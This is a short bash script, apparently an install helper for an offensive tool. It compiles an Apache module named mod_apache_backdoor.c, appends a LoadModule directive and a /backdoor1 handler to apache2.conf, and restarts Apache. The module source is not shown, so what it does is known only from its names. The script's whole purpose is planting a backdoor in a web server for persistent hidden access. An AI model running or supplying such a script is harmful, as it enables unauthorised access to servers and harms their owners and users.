#!/bin/bash

sudo apxs -i -c mod_apache_backdoor.c
sudo echo -e "LoadModule apache_backdoor_module /usr/lib/apache2/modules/mod_apache_backdoor.so\n<Location /backdoor1>\n\tSetHandler apache_backdoor\n</Location>" >> /etc/apache2/apache2.conf
sudo systemctl restart apache2
